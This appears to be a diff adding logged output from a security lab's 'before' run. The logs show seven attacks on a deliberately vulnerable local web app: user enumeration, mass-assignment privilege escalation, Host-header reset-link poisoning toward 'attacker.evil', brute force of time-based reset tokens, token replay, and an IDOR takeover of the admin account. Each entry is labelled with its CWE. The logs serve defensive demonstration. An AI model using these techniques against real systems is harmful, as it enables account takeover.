@@ -1,0 +1,173 @@
+### VULNERABLE (before) re-run ###
+########## enrollment_enumeration ##########
+====================================================================
+ATTACK #1 - Enrollment user enumeration via distinct errors
+Target: http://127.0.0.1:5000
+====================================================================
+
+[*] Probing usernames:
+    victim           -> EXISTS
+    root             -> EXISTS
+    administrator    -> free (now created)
+    jsmith           -> free (now created)
+    guest            -> free (now created)
+
+[*] Probing emails:
+    victim@corp.example          -> EXISTS
+    root@corp.example            -> EXISTS
+    ceo@corp.example             -> free (now created)
+    helpdesk@corp.example        -> free (now created)
+
+--------------------------------------------------------------------
+[+] ATTACKER GAIN - confirmed valid accounts (no auth needed):
+    usernames that exist: ['victim', 'root']
+    emails that exist:    ['victim@corp.example', 'root@corp.example']
+[+] These are now targets for phishing and recovery abuse (attack #3).
+--------------------------------------------------------------------
+
+########## mass_assignment ##########
+====================================================================
+ATTACK #2 - Mass assignment: self-grant admin at signup
+Target: http://127.0.0.1:5000
+====================================================================
+
+[*] Honest signup   -> HTTP 201: {"status":"registered","user":"honest_user"}
+[*] Malicious signup-> HTTP 201: {"status":"registered","user":"mallory"}
+    (payload carried "is_admin": 1)
+
+[*] Logging in to read the server-assigned privilege level:
+    honest_user is_admin = False
+    mallory     is_admin = True
+
+--------------------------------------------------------------------
+[+] ATTACKER GAIN - unauthenticated signup produced an ADMIN account.
+    The honest account is a normal user; only the payload differed.
+    Privilege escalation with zero prior access. (CWE-915)
+--------------------------------------------------------------------
+
+########## recovery_enumeration ##########
+====================================================================
+ATTACK #3 - Recovery-flow user enumeration (status + timing)
+Target: http://127.0.0.1:5000
+====================================================================
+
+[*] Signal 1 - response status/body oracle:
+    victim@corp.example      -> HTTP 200 EXISTS   {"status":"recovery email sent"}
+    root@corp.example        -> HTTP 200 EXISTS   {"status":"recovery email sent"}
+    ceo@corp.example         -> HTTP 404 absent   {"error":"no account with that email"}
+    nobody@nowhere.test      -> HTTP 404 absent   {"error":"no account with that email"}
+    sales@corp.example       -> HTTP 404 absent   {"error":"no account with that email"}
+
+[*] Signal 2 - covert timing channel (mean of 5 requests each):
+    known   (victim@corp.example   ) ~    6.85 ms
+    unknown (nobody@nowhere.test   ) ~    7.50 ms
+    known/unknown time ratio = 0.91x (timing close on this run)
+
+--------------------------------------------------------------------
+[+] ATTACKER GAIN - confirmed which emails have accounts, unauthenticated:
+    ['victim@corp.example', 'root@corp.example']
+[+] No signup needed; requests look like ordinary 'forgot password' traffic.
+--------------------------------------------------------------------
+
+########## host_header_injection ##########
+====================================================================
+ATTACK #4 - Host-header injection / reset-link poisoning
+Target: http://127.0.0.1:5000
+====================================================================
+
+[*] Sending forgot-password for victim@corp.example with Host: attacker.evil
+    server said -> HTTP 200: {"status":"recovery email sent"}
+
+[*] Link delivered to the victim's inbox:
+    http://attacker.evil/reset-password?token=1787579043939
+    -> hostname is 'attacker.evil' (attacker-controlled), NOT the real app.
+    -> but it carries the victim's LIVE token: 1787579043939
+
+[*] Attacker uses the captured token to reset the victim's password:
+    reset -> HTTP 200: {"account":"victim@corp.example","status":"password reset"}
+    login as victim with attacker's password -> HTTP 200: {"is_admin":false,"status":"ok","username":"victim"}
+
+--------------------------------------------------------------------
+[+] ATTACKER GAIN - the victim's genuine reset email points at the
+    attacker's domain. Clicking it leaks a live token; the attacker
+    resets the password and owns the account. (CWE-644)
+--------------------------------------------------------------------
+
+########## weak_secrets ##########
+====================================================================
+ATTACK #5 - Predictable time-based reset token (brute force)
+Target: http://127.0.0.1:5000
+====================================================================
+
+[*] Triggered reset for victim@corp.example -> HTTP 200
+    token = int(time.time()*1000) was assigned between:
+      1787579049981  and  1787579049992   (window = 12 ms)
+
+[*] Scanning candidate tokens 1787579049931..1787579050042 (112 guesses) against /reset-password -- no email access:
+    HIT after 59 guesses: token = 1787579049989
+    server -> {"account":"victim@corp.example","status":"password reset"}
+
+[*] Login as victim with attacker's password -> HTTP 200: {"is_admin":false,"status":"ok","username":"victim"}
+
+[*] Verification - real token from outbox was: 1787579049989
+    predicted == real ? True
+
+--------------------------------------------------------------------
+[+] ATTACKER GAIN - reconstructed the reset token from time alone,
+    in 59 guesses, with zero access to the victim's mailbox,
+    then took over the account. Tokens must be crypto-random. (CWE-330)
+--------------------------------------------------------------------
+
+########## token_replay ##########
+====================================================================
+ATTACK #6 - Token replay: no expiry, no single-use
+Target: http://127.0.0.1:5000
+====================================================================
+
+[A] SINGLE-USE VIOLATION - one token, reused repeatedly:
+    obtained token T1 = 1787579056492
+    use #1 (set 'replay_pw_A') -> HTTP 200: {"account":"victim@corp.example","status":"password reset"}
+        login with replay_pw_A ? True
+    use #2 SAME token (set 'replay_pw_B') -> HTTP 200: {"account":"victim@corp.example","status":"password reset"}
+        login with replay_pw_B ? True
+    use #3 SAME token (set 'replay_pw_C') -> HTTP 200: {"account":"victim@corp.example","status":"password reset"}
+        login with replay_pw_C ? True
+
+[B] NO SIBLING INVALIDATION - a completed reset should burn all
+    of a user's tokens; here older ones stay live:
+    issued T_old = 1787579056560
+    issued T_new = 1787579056571 (a newer request)
+    complete a reset using T_new -> HTTP 200
+    now reuse the OLDER T_old   -> HTTP 200: {"account":"victim@corp.example","status":"password reset"}
+        login with the stale-token password ? True
+
+--------------------------------------------------------------------
+[+] ATTACKER GAIN - a reset token is a permanent, reusable key.
+    The same token reset the password 3x; an older sibling token
+    still worked after a completed reset. Any once-seen token
+    grants indefinite account takeover. (CWE-640)
+--------------------------------------------------------------------
+
+########## idor_reset ##########
+====================================================================
+ATTACK #8 - IDOR / broken account binding on password reset
+Target: http://127.0.0.1:5000
+====================================================================
+
+[*] Baseline: login to root@corp.example with attacker's password -> HTTP 401 (expected 401)
+[*] Attacker registered own account: attacker@evil.example
+[*] Attacker got a legitimate reset token for their OWN account: 1787579062765
+
+[*] Submitting attacker's token but with "email":"root@corp.example":
+    server -> HTTP 200: {"account":"root@corp.example","status":"password reset"}
+
+[*] Login to root@corp.example with attacker's chosen password:
+    -> HTTP 200: {"is_admin":true,"status":"ok","username":"root"}
+
+--------------------------------------------------------------------
+[+] ATTACKER GAIN - full ADMIN takeover using a reset token the
+    attacker legitimately owns for their OWN account. The reset was
+    bound to a client-supplied email, never to the token. A random,
+    single-use, short-lived token would NOT fix this. (CWE-639)
+--------------------------------------------------------------------
+
